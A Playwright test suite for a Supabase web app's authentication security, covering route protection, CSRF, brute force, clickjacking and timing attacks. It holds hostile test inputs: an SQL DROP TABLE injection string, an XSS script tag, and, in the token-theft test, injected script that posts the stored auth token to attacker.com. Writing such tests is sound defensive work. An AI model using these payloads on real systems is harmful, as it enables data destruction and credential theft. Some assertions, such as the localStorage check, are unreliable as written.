import { test, expect } from '@playwright/test'

test.describe('Authentication Security', () => {
  test('should prevent access to protected routes without authentication', async ({ page }) => {
    const protectedRoutes = [
      '/dashboard',
      '/dashboard/notes',
      '/dashboard/projects',
      '/dashboard/areas',
      '/dashboard/resources',
      '/dashboard/archive',
      '/profile',
      '/settings',
    ]

    for (const route of protectedRoutes) {
      await page.goto(route)
      
      // Should redirect to login page
      await expect(page).toHaveURL('/')
      await expect(page.getByRole('heading', { name: /sign in/i })).toBeVisible()
    }
  })

  test('should prevent access with invalid token', async ({ page }) => {
    // Set invalid token in localStorage
    await page.goto('/')
    await page.evaluate(() => {
      localStorage.setItem('supabase.auth.token', 'invalid-token')
    })

    // Try to access protected route
    await page.goto('/dashboard')
    
    // Should redirect to login page
    await expect(page).toHaveURL('/')
    await expect(page.getByRole('heading', { name: /sign in/i })).toBeVisible()
  })

  test('should prevent access with expired token', async ({ page }) => {
    // Mock expired token
    await page.route('**/auth/v1/user*', async route => {
      await route.fulfill({
        status: 401,
        contentType: 'application/json',
        body: JSON.stringify({
          error: 'JWT expired',
        }),
      })
    })

    // Set expired token
    await page.goto('/')
    await page.evaluate(() => {
      localStorage.setItem('supabase.auth.token', 'expired-token')
    })

    // Try to access protected route
    await page.goto('/dashboard')
    
    // Should redirect to login page
    await expect(page).toHaveURL('/')
    await expect(page.getByRole('heading', { name: /sign in/i })).toBeVisible()
  })

  test('should prevent SQL injection in login form', async ({ page }) => {
    await page.goto('/')
    
    // Try SQL injection in email field
    await page.getByLabel(/email/i).fill("'; DROP TABLE users; --")
    await page.getByLabel(/password/i).fill('password123')
    await page.getByRole('button', { name: /sign in/i }).click()
    
    // Should show validation error, not execute SQL
    await expect(page.getByText(/invalid email/i)).toBeVisible()
  })

  test('should prevent XSS in login form', async ({ page }) => {
    await page.goto('/')
    
    // Try XSS in email field
    await page.getByLabel(/email/i).fill('<script>alert("xss")</script>')
    await page.getByLabel(/password/i).fill('password123')
    await page.getByRole('button', { name: /sign in/i }).click()
    
    // Should show validation error, not execute script
    await expect(page.getByText(/invalid email/i)).toBeVisible()
    
    // Check that no alert was triggered
    const alerts = await page.evaluate(() => {
      return window.alert.toString()
    })
    expect(alerts).not.toContain('xss')
  })

  test('should prevent brute force attacks', async ({ page }) => {
    await page.goto('/')
    
    // Try multiple failed login attempts
    for (let i = 0; i < 5; i++) {
      await page.getByLabel(/email/i).fill('test@example.com')
      await page.getByLabel(/password/i).fill('wrong-password')
      await page.getByRole('button', { name: /sign in/i }).click()
      
      await expect(page.getByText(/invalid credentials/i)).toBeVisible()
    }
    
    // Should show rate limiting message
    await expect(page.getByText(/too many attempts/i)).toBeVisible()
  })

  test('should prevent CSRF attacks', async ({ page }) => {
    // Mock successful authentication
    await page.route('**/auth/v1/token*', async route => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          access_token: 'mock-token',
          refresh_token: 'mock-refresh-token',
          expires_in: 3600,
          token_type: 'bearer',
          user: {
            id: 'test-user-id',
            email: 'test@example.com',
            user_metadata: {},
          },
        }),
      })
    })

    await page.goto('/')
    await page.getByLabel(/email/i).fill('test@example.com')
    await page.getByLabel(/password/i).fill('password123')
    await page.getByRole('button', { name: /sign in/i }).click()
    
    await expect(page).toHaveURL('/dashboard')
    
    // Try to make request without proper CSRF protection
    const response = await page.request.post('/api/notes', {
      data: {
        title: 'CSRF Attack',
        content: 'This should be blocked',
      },
      headers: {
        'X-CSRF-Token': 'invalid-token',
      },
    })
    
    // Should be blocked
    expect(response.status()).toBe(403)
  })

  test('should prevent session fixation', async ({ page }) => {
    // Get initial session
    await page.goto('/')
    const initialSession = await page.evaluate(() => {
      return localStorage.getItem('supabase.auth.token')
    })
    
    // Mock successful authentication
    await page.route('**/auth/v1/token*', async route => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          access_token: 'new-token',
          refresh_token: 'new-refresh-token',
          expires_in: 3600,
          token_type: 'bearer',
          user: {
            id: 'test-user-id',
            email: 'test@example.com',
            user_metadata: {},
          },
        }),
      })
    })
    
    await page.getByLabel(/email/i).fill('test@example.com')
    await page.getByLabel(/password/i).fill('password123')
    await page.getByRole('button', { name: /sign in/i }).click()
    
    // Session should be different after login
    const newSession = await page.evaluate(() => {
      return localStorage.getItem('supabase.auth.token')
    })
    
    expect(newSession).not.toBe(initialSession)
  })

  test('should prevent privilege escalation', async ({ page }) => {
    // Mock authentication as regular user
    await page.route('**/auth/v1/token*', async route => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          access_token: 'user-token',
          refresh_token: 'user-refresh-token',
          expires_in: 3600,
          token_type: 'bearer',
          user: {
            id: 'user-id',
            email: 'user@example.com',
            user_metadata: {},
            app_metadata: {
              role: 'user',
            },
          },
        }),
      })
    })

    await page.goto('/')
    await page.getByLabel(/email/i).fill('user@example.com')
    await page.getByLabel(/password/i).fill('password123')
    await page.getByRole('button', { name: /sign in/i }).click()
    
    await expect(page).toHaveURL('/dashboard')
    
    // Try to access admin routes
    await page.goto('/admin')
    
    // Should be blocked
    await expect(page.getByText(/access denied/i)).toBeVisible()
  })

  test('should prevent token theft via XSS', async ({ page }) => {
    // Mock successful authentication
    await page.route('**/auth/v1/token*', async route => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          access_token: 'sensitive-token',
          refresh_token: 'sensitive-refresh-token',
          expires_in: 3600,
          token_type: 'bearer',
          user: {
            id: 'test-user-id',
            email: 'test@example.com',
            user_metadata: {},
          },
        }),
      })
    })

    await page.goto('/')
    await page.getByLabel(/email/i).fill('test@example.com')
    await page.getByLabel(/password/i).fill('password123')
    await page.getByRole('button', { name: /sign in/i }).click()
    
    await expect(page).toHaveURL('/dashboard')
    
    // Try to inject script that steals tokens
    await page.evaluate(() => {
      const script = document.createElement('script')
      script.textContent = `
        fetch('https://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify({
            token: localStorage.getItem('supabase.auth.token')
          })
        })
      `
      document.head.appendChild(script)
    })
    
    // Check that tokens are not accessible via script
    const tokenAccessible = await page.evaluate(() => {
      try {
        return localStorage.getItem('supabase.auth.token') !== null
      } catch (e) {
        return false
      }
    })
    
    // Tokens should be protected
    expect(tokenAccessible).toBe(false)
  })

  test('should prevent clickjacking', async ({ page }) => {
    await page.goto('/')
    
    // Check for X-Frame-Options header
    const response = await page.goto('/')
    const headers = response?.headers()
    
    expect(headers?.['x-frame-options']).toBe('DENY')
  })

  test('should prevent information disclosure in error messages', async ({ page }) => {
    await page.goto('/')
    
    // Try to access non-existent route
    await page.goto('/nonexistent-route')
    
    // Should show generic error, not stack trace
    await expect(page.getByText(/page not found/i)).toBeVisible()
    await expect(page.getByText(/stack trace/i)).not.toBeVisible()
  })

  test('should prevent timing attacks', async ({ page }) => {
    await page.goto('/')
    
    // Measure response time for valid vs invalid email
    const startTime = Date.now()
    
    await page.getByLabel(/email/i).fill('test@example.com')
    await page.getByLabel(/password/i).fill('wrong-password')
    await page.getByRole('button', { name: /sign in/i }).click()
    
    await expect(page.getByText(/invalid credentials/i)).toBeVisible()
    const validEmailTime = Date.now() - startTime
    
    // Try with invalid email
    await page.reload()
    const startTime2 = Date.now()
    
    await page.getByLabel(/email/i).fill('nonexistent@example.com')
    await page.getByLabel(/password/i).fill('wrong-password')
    await page.getByRole('button', { name: /sign in/i }).click()
    
    await expect(page.getByText(/invalid credentials/i)).toBeVisible()
    const invalidEmailTime = Date.now() - startTime2
    
    // Response times should be similar (within 100ms)
    expect(Math.abs(validEmailTime - invalidEmailTime)).toBeLessThan(100)
  })
})
